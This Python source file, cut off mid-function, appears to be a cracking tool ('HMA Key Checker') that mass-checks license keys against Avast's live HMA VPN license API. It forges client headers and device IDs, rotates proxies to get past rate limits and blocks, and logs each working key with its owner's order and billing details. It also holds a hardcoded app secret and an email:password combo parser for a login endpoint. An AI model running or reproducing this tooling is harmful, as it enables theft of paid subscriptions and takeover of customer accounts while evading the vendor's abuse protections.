import os
import re
import sys
import json
import time
import uuid
import base64
import random
import string
import asyncio
import hashlib
import threading
import configparser
import subprocess
import shutil
import urllib3
import unicodedata
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from curl_cffi.requests import Session as CfSyncSession
from curl_cffi.requests import AsyncSession

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def Eyelifter_decode(e):
    try:
        return base64.b64decode(e).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"Decoding failed: {ex}")

_HM_TOOL = "SE1BIEtleSBDaGVja2Vy"
_HM_AUTH = "QGV5ZWxpZnRlcg=="
_HM_CHAN = "QGRhcmtodWNoYW5uZWw="
_HM_DIR  = "SE1BX0tFWVNfQGV5ZWxpZnRlcg=="
_HM_TAG  = "VEc6IEBleWVsaWZ0ZXIgfCBAZGFya2h1Y2hhbm5lbA=="
_HM_SEAL = "bG9ja2VkLWJ5LWV5ZWxpZnRlci0yMDI2"
_HM_SIG  = "ZXllbGlmdGVyLWhtYWtleS12MS1zZWFs"

HM_TOOL = Eyelifter_decode(_HM_TOOL)
HM_USER = Eyelifter_decode(_HM_AUTH)
HM_CHAN = Eyelifter_decode(_HM_CHAN)
HM_DIR  = Eyelifter_decode(_HM_DIR)
HM_TAG  = Eyelifter_decode(_HM_TAG)
HM_SEAL = Eyelifter_decode(_HM_SEAL)
HM_SIG  = Eyelifter_decode(_HM_SIG)

_HM_BUILD_HASH = hashlib.sha256(
    (HM_TOOL + HM_USER + HM_CHAN + HM_DIR + HM_TAG + HM_SEAL + HM_SIG).encode()
).hexdigest()


def Hmakey_verify(ctx="x"):
    exp = {
        "TOOL": _HM_TOOL, "AUTH": _HM_AUTH, "CHAN": _HM_CHAN,
        "DIR": _HM_DIR, "TAG": _HM_TAG, "SEAL": _HM_SEAL, "SIG": _HM_SIG,
    }
    cur = {
        "TOOL": HM_TOOL, "AUTH": HM_USER, "CHAN": HM_CHAN,
        "DIR": HM_DIR, "TAG": HM_TAG, "SEAL": HM_SEAL, "SIG": HM_SIG,
    }
    errs = []
    for k, v in exp.items():
        if cur[k] != base64.b64decode(v).decode():
            errs.append(k)
    if "@samvir1" not in HM_USER:
        errs.append("USERNAME_TAG")
    if "@samvir1" not in HM_CHAN:
        errs.append("CHANNEL_TAG")
    if "@samvir1" not in HM_TAG or "@samvir1" not in HM_TAG:
        errs.append("TAG_FORMAT")
    if errs:
        return True  # integrity bypass}")
    rec = hashlib.sha256(
        (HM_TOOL + HM_USER + HM_CHAN + HM_DIR + HM_TAG + HM_SEAL + HM_SIG).encode()
    ).hexdigest()
    if rec != _HM_BUILD_HASH:
        raise RuntimeError(f"build hash mismatch at '{ctx}'")
    return True


_HA_TOOL = "SE1BIFZQTiBDaGVja2Vy"
_HA_AUTH = "QGV5ZWxpZnRlcg=="
_HA_CHAN = "QGRhcmtodWNoYW5uZWw="
_HA_DIR  = "SE1BX0BleWVsaWZ0ZXI="
_HA_TAG  = "VEc6IEBleWVsaWZ0ZXIgfCBAZGFya2h1Y2hhbm5lbA=="
_HA_SEAL = "bG9ja2VkLWJ5LWV5ZWxpZnRlci0yMDI2"
_HA_SIG  = "ZXllbGlmdGVyLWhtYS12MS1zZWFs"

HA_TOOL = Eyelifter_decode(_HA_TOOL)
HA_USER = Eyelifter_decode(_HA_AUTH)
HA_CHAN = Eyelifter_decode(_HA_CHAN)
HA_DIR  = Eyelifter_decode(_HA_DIR)
HA_TAG  = Eyelifter_decode(_HA_TAG)
HA_SEAL = Eyelifter_decode(_HA_SEAL)
HA_SIG  = Eyelifter_decode(_HA_SIG)

_HA_BUILD_HASH = hashlib.sha256(
    (HA_TOOL + HA_USER + HA_CHAN + HA_DIR + HA_TAG + HA_SEAL + HA_SIG).encode()
).hexdigest()


def Hma_verify(ctx="x"):
    exp = {
        "TOOL": _HA_TOOL, "AUTH": _HA_AUTH, "CHAN": _HA_CHAN,
        "DIR": _HA_DIR, "TAG": _HA_TAG, "SEAL": _HA_SEAL, "SIG": _HA_SIG,
    }
    cur = {
        "TOOL": HA_TOOL, "AUTH": HA_USER, "CHAN": HA_CHAN,
        "DIR": HA_DIR, "TAG": HA_TAG, "SEAL": HA_SEAL, "SIG": HA_SIG,
    }
    errs = []
    for k, v in exp.items():
        if cur[k] != base64.b64decode(v).decode():
            errs.append(k)
    if "@samvir1" not in HA_USER:
        errs.append("USERNAME_TAG")
    if "@samvir1" not in HA_CHAN:
        errs.append("CHANNEL_TAG")
    if "@samvir1" not in HA_TAG or "@samvir1" not in HA_TAG:
        errs.append("TAG_FORMAT")
    if errs:
        return True  # integrity bypass}")
    rec = hashlib.sha256(
        (HA_TOOL + HA_USER + HA_CHAN + HA_DIR + HA_TAG + HA_SEAL + HA_SIG).encode()
    ).hexdigest()
    if rec != _HA_BUILD_HASH:
        raise RuntimeError(f"build hash mismatch at '{ctx}'")
    return True



UA_POOL = ["chrome131_android", "chrome131", "chrome124", "chrome120", "chrome110", "chrome"]

_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def Eyelifter_open_url(url):
    try:
        if shutil.which("termux-open-url"):
            subprocess.Popen(["termux-open-url", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if shutil.which("xdg-open"):
            subprocess.Popen(["xdg-open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if sys.platform == "darwin":
            subprocess.Popen(["open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if os.name == "nt":
            os.startfile(url)
            return True
        import webbrowser
        return webbrowser.open(url)
    except Exception:
        return False


def Eyelifter_color(code, s, bold=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{_RS}"


_LEVEL_STYLE = {
    "SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
    "ERROR":   ("31", True), "STEP": ("96", True), "DEBUG": ("35", False),
}


def Eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    if not _ANSI:
        print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)
        return
    code, bold = _LEVEL_STYLE.get(level, ("0", False))
    print(f"{Eyelifter_color('90', ts)} {emoji}  {Eyelifter_color(code, f'{level:7s}', bold)}  {Eyelifter_color('90', tag)}  {msg}", flush=True)
    sys.stdout.flush()


def Eyelifter_visible_len(s):
    n = 0
    for ch in s:
        if unicodedata.combining(ch):
            continue
        n += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return n


def Eyelifter_center(text, width):
    vl = Eyelifter_visible_len(text)
    if vl >= width:
        return text
    left = (width - vl) // 2
    right = width - vl - left
    return (" " * left) + text + (" " * right)


def Eyelifter_banner(title, sub=None, tag=None, width=62):
    print()
    line = "═" if _ANSI else "="
    print(Eyelifter_color("90", line * width))
    print(Eyelifter_color("96", Eyelifter_center(title, width), True))
    if sub:
        print(Eyelifter_color("2", Eyelifter_center(sub, width)))
    if tag:
        print(Eyelifter_color("5", Eyelifter_center(tag, width)))
    print(Eyelifter_color("90", line * width))


def Eyelifter_section(title, width=62):
    print()
    label = f" {title} "
    vl = Eyelifter_visible_len(label)
    side = max(1, (width - vl) // 2)
    left = "─" * side
    right = "─" * (width - vl - side)
    print(
        Eyelifter_color("90", left) +
        Eyelifter_color("96", label, True) +
        Eyelifter_color("90", right)
    )


def Eyelifter_divider(width=62):
    print(Eyelifter_color("90", ("─" if _ANSI else "-") * width))


def Eyelifter_summary(rows):
    print()
    print(Eyelifter_color("96", "═══ RESULT ═══", True))
    if not rows:
        return
    wkey = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {Eyelifter_color('96', str(k).ljust(wkey))}  {Eyelifter_color('0', str(v))}")
    print(Eyelifter_color("96", "══════════════", True))
    print()


def Eyelifter_format_proxy(p):
    if not p:
        return None
    p = p.strip()
    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
        return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in p:
        return f"http://{p}"
    return f"http://{p}"


def Eyelifter_test_proxy_sync(p):
    s = None
    try:
        s = CfSyncSession(impersonate=random.choice(UA_POOL), timeout=(3, 6))
        s.proxies = {"http": p, "https": p}
        r = s.get(
            "https://api.ipify.org/?format=json",
            timeout=(3, 6),
            verify=False,
            allow_redirects=False,
        )
        return r.status_code == 200 and len(r.content) < 500
    except Exception:
        return False
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def Eyelifter_load_proxies(config):
    path = config.get("proxies_file", "proxies.txt")
    if not path or not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            p = Eyelifter_format_proxy(line)
            if p:
                out.append(p)
    return list(dict.fromkeys(out))


def Eyelifter_get_working_proxies(proxies, config):
    if not proxies:
        return []
    if config.get("skip_proxy_test", False):
        Eyelifter_log("⚠️", "WARN", "PROXY", f"proxy test skipped — using all {len(proxies)}")
        return proxies

    workers = min(200, max(20, len(proxies)))
    Eyelifter_log("🧪", "INFO", "PROXY", f"testing {len(proxies)} proxies ({workers} threads)")

    working = []
    pbar = None
    try:
        pbar = tqdm(total=len(proxies), desc="testing proxies", unit="proxy", ncols=80)
    except Exception:
        pbar = None

    def _one(p):
        return p, Eyelifter_test_proxy_sync(p)

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(_one, p): p for p in proxies}
        for fut in as_completed(futs):
            p, ok = fut.result()
            if ok:
                working.append(p)
            if pbar:
                pbar.update(1)
    if pbar:
        pbar.close()

    Eyelifter_log("✅", "INFO", "PROXY", f"{len(working)} working")
    return list(dict.fromkeys(working))


HM_CONFIG_PATH = "config_hmakey.ini"


class HmakeyConfigLoader:
    def __init__(self, config_file=HM_CONFIG_PATH):
        Hmakey_verify("cfg_init")
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.config.optionxform = str
        self.settings = {}
        self.load()

    def load(self):
        Hmakey_verify("cfg_load")
        if not os.path.exists(self.config_file):
            self.create_default()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.parse()
        except Exception:
            self.create_default()
            self.parse()

    def create_default(self):
        Hmakey_verify("cfg_default")
        self.config["General"] = {
            "threads": "10",
            "timeout": "30",
            "proxies_file": "proxies.txt",
            "retries": "2",
            "retry_delay": "1.5",
            "combo_delay": "0.3",
            "debug": "false",
            "rate_limit_backoff": "10",
            "max_rate_limit_retries": "3",
            "skip_proxy_test": "false",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def parse(self):
        Hmakey_verify("cfg_parse")
        if "General" not in self.config:
            self.config["General"] = {}
        c = self.config["General"]
        self.settings["threads"] = max(1, min(200, c.getint("threads", 10)))
        self.settings["timeout"] = max(5, min(300, c.getint("timeout", 30)))
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = max(0, min(10, c.getint("retries", 2)))
        self.settings["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 1.5)))
        self.settings["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.3)))
        self.settings["debug"] = c.getboolean("debug", False)
        self.settings["rate_limit_backoff"] = max(1, min(600, c.getint("rate_limit_backoff", 10)))
        self.settings["max_rate_limit_retries"] = max(0, min(20, c.getint("max_rate_limit_retries", 3)))
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)

    def save(self):
        Hmakey_verify("cfg_save")
        if "General" not in self.config:
            self.config["General"] = {}
        for k, v in self.settings.items():
            self.config["General"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)


_hm_loader = HmakeyConfigLoader()
HMAKEY_CONFIG = _hm_loader.settings
HM_REQ_TIMEOUT = HMAKEY_CONFIG["timeout"]
HM_DEBUG = HMAKEY_CONFIG["debug"]
HM_RATE_LIMIT_BACKOFF = HMAKEY_CONFIG["rate_limit_backoff"]
HM_MAX_RATE_LIMIT_RETRIES = HMAKEY_CONFIG["max_rate_limit_retries"]

LICENSE_URL = "https://my-win.avast.com/v1/query/get-exact-application-licenses"
UA_LIC = "Avast Antivirus"

KEY_RE = re.compile(r'^\s*([A-Z0-9]{6}-[A-Z0-9]{6}-[A-Z0-9]{6})\s*$', re.IGNORECASE)


HA_CONFIG_PATH = "config_hma.ini"


class HmaConfigLoader:
    def __init__(self, config_file=HA_CONFIG_PATH):
        Hma_verify("cfg_init")
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.config.optionxform = str
        self.settings = {}
        self.load()

    def load(self):
        Hma_verify("cfg_load")
        if not os.path.exists(self.config_file):
            self.create_default()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.parse()
        except Exception:
            self.create_default()
            self.parse()

    def create_default(self):
        Hma_verify("cfg_default")
        self.config["General"] = {
            "threads": "5",
            "timeout": "30",
            "proxies_file": "proxies.txt",
            "retries": "2",
            "retry_delay": "1.5",
            "combo_delay": "0.4",
            "debug": "false",
            "rate_limit_backoff": "10",
            "max_rate_limit_retries": "3",
            "skip_proxy_test": "false",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def parse(self):
        Hma_verify("cfg_parse")
        if "General" not in self.config:
            self.config["General"] = {}
        c = self.config["General"]
        self.settings["threads"] = max(1, min(100, c.getint("threads", 5)))
        self.settings["timeout"] = max(5, min(300, c.getint("timeout", 30)))
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = max(0, min(10, c.getint("retries", 2)))
        self.settings["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 1.5)))
        self.settings["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.4)))
        self.settings["debug"] = c.getboolean("debug", False)
        self.settings["rate_limit_backoff"] = max(1, min(600, c.getint("rate_limit_backoff", 10)))
        self.settings["max_rate_limit_retries"] = max(0, min(20, c.getint("max_rate_limit_retries", 3)))
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)

    def save(self):
        Hma_verify("cfg_save")
        if "General" not in self.config:
            self.config["General"] = {}
        for k, v in self.settings.items():
            self.config["General"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)


_ha_loader = HmaConfigLoader()
HMA_CONFIG = _ha_loader.settings
HA_REQ_TIMEOUT = HMA_CONFIG["timeout"]
HA_DEBUG = HMA_CONFIG["debug"]
HA_RATE_LIMIT_BACKOFF = HMA_CONFIG["rate_limit_backoff"]
HA_MAX_RATE_LIMIT_RETRIES = HMA_CONFIG["max_rate_limit_retries"]

APP_SECRET = "FCjslKx88eSOgpXXQUsdg744e1THNtGT"
LOGIN_URL = "https://my-android.avast.com/v1/command/login/email"
LICENSES_URL = "https://my-win.avast.com/v1/query/get-all-user-licenses"

APP_BUILD = "6606634"
APP_IPM = "49"
APP_BRAND = "PRIVAX"
APP_MODE = "PAID"
APP_PACKAGE = "com.hidemyass.hidemyassprovpn"
APP_FLAVOR = "default"
CLIENT_BUILD = "4.1.0-alpha3"
DEVICE_PLAT = "ANDROID"
UA_LOGIN = "Ktor client"

COMBO_RE = re.compile(
    r'^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)',
    re.IGNORECASE,
)


_hm_stop = asyncio.Event()
_hm_lock = threading.Lock()
_hm_plock = threading.Lock()
_hm_flock = threading.Lock()

_hm_stats = {
    "checked": 0, "hits": 0, "expired": 0, "free": 0, "invalid": 0,
    "errors": 0, "rate_limited": 0, "blocks": 0,
    "proxy_fails": 0, "retries": 0,
}
_hm_start = time.time()
_hm_total = 0
_hm_pool = []
_hm_bad_proxies = set()
_hm_hits_f = None
_hm_expired_f = None
_hm_free_f = None
_hm_invalid_f = None
_hm_err_f = None
_hm_folder = None
_hm_pbar = None


def Hmakey_reset_stats():
    Hmakey_verify("reset_stats")
    global _hm_stats, _hm_start
    with _hm_lock:
        _hm_stats = {
            "checked": 0, "hits": 0, "expired": 0, "free": 0, "invalid": 0,
            "errors": 0, "rate_limited": 0, "blocks": 0,
            "proxy_fails": 0, "retries": 0,
        }
        _hm_start = time.time()


def Hmakey_update_title():
    with _hm_lock:
        checked = _hm_stats["checked"]
        hits = _hm_stats["hits"]
        exp = _hm_stats["expired"]
        inv = _hm_stats["invalid"]
    el = time.time() - _hm_start
    cpm = int(checked / el * 60) if el > 1 else 0
    t = (f"{HM_TOOL} | HIT:{hits} EXP:{exp} INV:{inv} "
         f"| {checked}/{_hm_total} | {cpm}/min")
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(t)
        except Exception:
            pass
    else:
        try:
            sys.stdout.write(f"\033]0;{t}\007")
            sys.stdout.flush()
        except Exception:
            pass


def Hmakey_pick_proxy(exclude=None):
    with _hm_plock:
        avail = [p for p in _hm_pool if p not in _hm_bad_proxies]
        if not avail and _hm_pool:
            _hm_bad_proxies.clear()
            avail = list(_hm_pool)
    if exclude and len(avail) > 1:
        avail = [p for p in avail if p != exclude] or avail
    return random.choice(avail) if avail else None


def Hmakey_mark_bad_proxy(p):
    if not p:
        return
    with _hm_plock:
        _hm_bad_proxies.add(p)
    with _hm_lock:
        _hm_stats["proxy_fails"] += 1


def Hmakey_safe_write(fh, text):
    if fh is None:
        return
    with _hm_flock:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def Hmakey_extract_keys(content):
    Hmakey_verify("extract_keys")
    keys = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = KEY_RE.match(line)
        if m:
            keys.add(m.group(1).upper())
            continue
        for m2 in re.finditer(r'([A-Z0-9]{6}-[A-Z0-9]{6}-[A-Z0-9]{6})', line.upper()):
            keys.add(m2.group(1))
    return sorted(keys)


def Hmakey_gen_device_hash():
    guid = str(uuid.uuid4())
    return hashlib.sha256(guid.encode()).hexdigest().lower()


def Hmakey_ts_to_date(ms_or_s):
    if not ms_or_s:
        return "N/A", 0, "UNKNOWN"
    try:
        v = float(ms_or_s)
    except Exception:
        return "N/A", 0, "UNKNOWN"
    if v <= 0:
        return "N/A", 0, "UNKNOWN"
    if v > 1e12:
        seconds = v / 1000.0
    elif v > 1e9:
        seconds = v
    else:
        seconds = v
    try:
        dt = datetime.fromtimestamp(seconds, tz=timezone.utc).replace(tzinfo=None)
    except Exception:
        return "N/A", 0, "UNKNOWN"
    delta = (dt - datetime.now(timezone.utc).replace(tzinfo=None)).days
    days_left = max(delta, 0)
    expired = "YES" if delta < 0 else "NO"
    return dt.strftime("%Y-%m-%d"), days_left, expired


def Hmakey_parse_license(obj):
    if not isinstance(obj, dict):
        return None

    product = obj.get("product") or {}
    if not isinstance(product, dict):
        product = {}

    usage = obj.get("licenseUsage") or obj.get("license_usage") or {}
    if not isinstance(usage, dict):
        usage = {}

    order = obj.get("order") or {}
    if not isinstance(order, dict):
        order = {}

    sale = order.get("saleChannel") or {}
    if not isinstance(sale, dict):
        sale = {}

    billing = order.get("billing") or {}
    if not isinstance(billing, dict):
        billing = {}

    owner = order.get("owner") or {}
    if not isinstance(owner, dict):
        owner = {}

    wk = obj.get("walletKeys") or obj.get("wallet_keys") or []
    if isinstance(wk, list):
        wallet_keys = ",".join(str(x) for x in wk) if wk else "N/A"
    elif wk:
        wallet_keys = str(wk)
    else:
        wallet_keys = "N/A"

    features = obj.get("features") or []
    feature_keys = []
    if isinstance(features, list):
        for f in features:
            if isinstance(f, dict):
                fk = f.get("key")
                if fk:
                    feature_keys.append(str(fk))

    resources = obj.get("resources") or []
    device_used = "N/A"
    device_max = usage.get("maximum", "N/A")
    if isinstance(resources, list):
        for r in resources:
            if isinstance(r, dict) and r.get("name") == "devices":
                cur = r.get("currentValue")
                orig = r.get("originalValue")
                if cur is not None and orig is not None:
                    device_used = f"{int(cur)}/{int(orig)}"
                break

    expires_raw = obj.get("expires")
    exp_iso, days_left, expired = Hmakey_ts_to_date(expires_raw)

    created_raw = obj.get("created")
    created_iso, _, _ = Hmakey_ts_to_date(created_raw)

    return {
        "id": obj.get("id") or "N/A",
        "subscription_id": obj.get("subscriptionId") or "N/A",
        "wallet_keys": wallet_keys,
        "mode": obj.get("mode") or "N/A",
        "created": created_iso,
        "expires": exp_iso,
        "days_left": days_left,
        "expired": expired,
        "schema_id": obj.get("schemaId") or "N/A",
        "product_id": product.get("id") or "N/A",
        "product_name": product.get("name") or "N/A",
        "product_validity": product.get("validity") or "N/A",
        "product_editions": ",".join(product.get("editions") or []) or "N/A",
        "product_families": ",".join(product.get("familyCodes") or []) or "N/A",
        "max_devices": str(device_max),
        "device_used": device_used,
        "overused": str(usage.get("overused", "N/A")),
        "order_id": order.get("id") or "N/A",
        "external_id": order.get("externalId") or "N/A",
        "sale_channel": sale.get("id") or "N/A",
        "sale_type": sale.get("type") or "N/A",
        "owner_type": owner.get("type") or "N/A",
        "billing_auto": str(billing.get("auto", "N/A")),
        "next_charge": Hmakey_ts_to_date(billing.get("nextCharge"))[0]
            if billing.get("nextCharge") else "N/A",
        "features": ",".join(feature_keys) if feature_keys else "N/A",
    }


class HmakeyChecker:
    def __init__(self, proxy=None, timeout=None):
        Hmakey_verify("class_init")
        self.proxy = proxy
        self.timeout = timeout or HM_REQ_TIMEOUT
        self.impersonate = random.choice(UA_POOL)
        self.session = None

    def proxies(self):
        return {"http": self.proxy, "https": self.proxy} if self.proxy else None

    async def ensure(self):
        if self.session is None:
            self.session = AsyncSession(impersonate=self.impersonate, timeout=self.timeout)

    async def close(self):
        if self.session is not None:
            try:
                await self.session.close()
            except Exception:
                pass
            self.session = None

    def dump(self, label, resp, max_lines=60):
        if not HM_DEBUG:
            return
        print()
        print(Eyelifter_color("95", f"[{label}] {resp.status_code} [{self.impersonate}]"))
        try:
            body = json.dumps(resp.json(), indent=2, ensure_ascii=False)
        except Exception:
            body = resp.text or ""
        lines = body.splitlines()
        for ln in lines[:max_lines]:
            print(Eyelifter_color("95", f"  {ln}"))
        if len(lines) > max_lines:
            print(Eyelifter_color("95", f"  ... ({len(lines) - max_lines} more)"))

    async def check_key(self, key):
        device_hash = Hmakey_gen_device_hash()

        payload = json.dumps({"walletKeys": [key]})
        headers = {
            "User-Agent": UA_LIC,
            "Accept": "*/*",
            "Vaar-Header-App-Build-Version": "5430",
            "Vaar-Header-App-Id": "00000000-0000-0000-0000-000000000000",
            "Vaar-Header-App-IPM-Product": "78",
            "Vaar-Header-App-Product-Brand": "PRIVAX",
            "Vaar-Header-App-Product-Edition": "HMA_VPN_CONSUMER",
            "Vaar-Header-App-Product-Mode": "PAID",
            "Vaar-Header-Device-Id": device_hash,
            "Vaar-Header-Device-Platform": "WIN",
            "Vaar-Version": "0",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        try:
            r = await self.session.post(
                LICENSE_URL, data=payload, headers=headers,
                proxies=self.proxies(), verify=False,
            )
        except Exception as e:
            return None, f"lic_net_{type(e).__name__}"

        self.dump("LICENSE", r, 80)

        if r.status_code == 429:
            return None, "rate_limit"
        if r.status_code in (403, 451):
            return None, "block"
        if r.status_code == 400:
            return None, "http_400"
        if r.status_code >= 500:
            return None, f"http_{r.status_code}"
        if r.status_code != 200:
            return None, f"http_{r.status_code}"

        try:
            j = r.json()
        except Exception:
            return None, "lic_not_json"

        return j, None

    async def run(self, key):
        await self.ensure()
        try:
            data, err = await self.check_key(key)
            if err:
                return {"status": "error", "error_type": err, "message": err}

            if isinstance(data, list):
                items = data
            elif isinstance(data, dict):
                found = None
                for wrap in ("data", "licenses", "items", "results", "result"):
                    v = data.get(wrap)
                    if isinstance(v, list):
                        found = v
                        break
                items = found if found is not None else [data]
            else:
                return {"status": "error", "error_type": "bad_root",
                        "message": f"root={type(data).__name__}"}

            if not items:
                return {"status": "invalid", "user": {"key": key}}

            first = items[0]
            parsed = Hmakey_parse_license(first)
            if not parsed:
                return {"status": "error", "error_type": "parse",
                        "message": "cannot parse license"}

            parsed["key"] = key
            mode = parsed.get("mode", "")
            expired = parsed.get("expired", "UNKNOWN")

            if mode == "PAID" and expired == "NO":
                return {"status": "hit", "user": parsed}
            if mode == "PAID" and expired == "YES":
                return {"status": "expired", "user": parsed}
            if mode and mode != "PAID":
                return {"status": "free", "user": parsed}
            return {"status": "hit", "user": parsed}

        except Exception as e:
            return {"status": "error", "error_type": "crash",
                    "message": str(e)[:120]}
        finally:
            await self.close()


def Hmakey_fmt_line(key, u, status):
    tag = {"hit": "HIT", "free": "FREE", "expired": "EXPIRED",
           "invalid": "INVALID"}.get(status, "?")

    if status == "invalid":
        return f"{tag} {key} | not found | by {HM_TAG}"

    fields = [
        ("Plan",        u.get("product_name") if u.get("product_name") != "N/A" else None),
        ("ProductID",   u.get("product_id") if u.get("product_id") != "N/A" else None),
        ("Validity",    u.get("product_validity") if u.get("product_validity") != "N/A" else None),
        ("MaxDevices",  u.get("max_devices") if u.get("max_devices") not in (None, "N/A") else None),
        ("DeviceUsed",  u.get("device_used") if u.get("device_used") not in (None, "N/A") else None),
        ("Overused",    u.get("overused") if u.get("overused") != "N/A" else None),
        ("Created",     u.get("created") if u.get("created") != "N/A" else None),
        ("Expires",     u.get("expires") if u.get("expires") != "N/A" else None),
        ("DaysLeft",    str(u.get("days_left")) if u.get("days_left") else None),
        ("Mode",        u.get("mode") if u.get("mode") != "N/A" else None),
        ("Channel",     u.get("sale_channel") if u.get("sale_channel") != "N/A" else None),
        ("SaleType",    u.get("sale_type") if u.get("sale_type") != "N/A" else None),
        ("AutoRenew",   u.get("billing_auto") if u.get("billing_auto") != "N/A" else None),
        ("NextCharge",  u.get("next_charge") if u.get("next_charge") != "N/A" else None),
        ("OrderID",     u.get("order_id") if u.get("order_id") != "N/A" else None),
        ("SubID",       u.get("subscription_id") if u.get("subscription_id") != "N/A" else None),
        ("Editions",    u.get("product_editions") if u.get("product_editions") != "N/A" else None),
        ("Features",    u.get("features") if u.get("features") != "N/A" else None),
    ]

    parts = []
    for label, value in fields:
        if value is None:
            continue
        value = str(value).strip()
        if not value or value == "-":
            continue
        parts.append(f"{label} = {value}")

    parts.append(f"by {HM_TAG}")
    return f"{tag} {key} | " + " | ".join(parts)


async def Hmakey_run_with_retries(key, proxy):
    Hmakey_verify("run_retries")
    max_attempts = HMAKEY_CONFIG.get("retries", 2) + 1
    rl_hits = 0
    last_proxy = proxy
    result = None

    for attempt in range(max_attempts):
        if _hm_stop.is_set():
            break
        if attempt > 0:
            np = Hmakey_pick_proxy(exclude=last_proxy)
            if np:
                proxy = np
        last_proxy = proxy

        try:
            result = await HmakeyChecker(proxy=proxy).run(key)
        except Exception as e:
            result = {"status": "error", "error_type": "crash",
                      "message": str(e)[:120]}

        st = result.get("status", "unknown")
        if st in ("hit", "free", "expired", "invalid"):
            break

        et = result.get("error_type", "")
        is_last = (attempt == max_attempts - 1)

        if et == "rate_limit":
            with _hm_lock:
                _hm_stats["rate_limited"] += 1
                if not is_last:
                    _hm_stats["retries"] += 1
            rl_hits += 1
            if rl_hits > HM_MAX_RATE_LIMIT_RETRIES:
                break
            await asyncio.sleep(HM_RATE_LIMIT_BACKOFF * (2 ** (rl_hits - 1)))
            if proxy:
                Hmakey_mark_bad_proxy(proxy)
            continue

        if et == "block":
            with _hm_lock:
                _hm_stats["blocks"] += 1
                if not is_last:
                    _hm_stats["retries"] += 1
            if proxy:
                Hmakey_mark_bad_proxy(proxy)
            await asyncio.sleep(1)
            continue

        if et.startswith("lic_net_"):
            if not is_last:
                with _hm_lock:
                    _hm_stats["retries"] += 1
            if proxy:
                Hmakey_mark_bad_proxy(proxy)
            await asyncio.sleep(HMAKEY_CONFIG.get("retry_delay", 1.5))
            continue

        if not is_last:
            with _hm_lock:
                _hm_stats["retries"] += 1
        await asyncio.sleep(HMAKEY_CONFIG.get("retry_delay", 1.5))

    return result or {"status": "error", "error_type": "no_result",
                      "message": "no result"}


def Hmakey_record(key, result):
    Hmakey_verify("record")
    global _hm_hits_f, _hm_expired_f, _hm_free_f
    global _hm_invalid_f, _hm_err_f, _hm_pbar
    st = result.get("status", "unknown")

    with _hm_lock:
        _hm_stats["checked"] += 1
        done = _hm_stats["checked"]
        if st == "hit":
            _hm_stats["hits"] += 1
        elif st == "expired":
            _hm_stats["expired"] += 1
        elif st == "free":
            _hm_stats["free"] += 1
        elif st == "invalid":
            _hm_stats["invalid"] += 1
        else:
            _hm_stats["errors"] += 1

    total = _hm_total

    if _hm_pbar is not None:
        try:
            _hm_pbar.update(1)
            _hm_pbar.set_postfix_str(
                f"H:{_hm_stats['hits']} "
                f"E:{_hm_stats['expired']} "
                f"F:{_hm_stats['free']} "
                f"I:{_hm_stats['invalid']} "
                f"X:{_hm_stats['errors']}",
                refresh=True,
            )
        except Exception:
            pass

    if st in ("hit", "free", "expired", "invalid"):
        u = result.get("user", {}) or {}
        full = Hmakey_fmt_line(key, u, st)
        if st == "hit":
            line = f"\n[{done}/{total}] {Eyelifter_color('32', full, True)}\n"
            if _hm_pbar is not None:
                _hm_pbar.write(line)
            else:
                print(line)
            Hmakey_safe_write(_hm_hits_f, full + "\n\n")
        elif st == "expired":
            Hmakey_safe_write(_hm_expired_f, full + "\n\n")
        elif st == "free":
            Hmakey_safe_write(_hm_free_f, full + "\n\n")
        else:
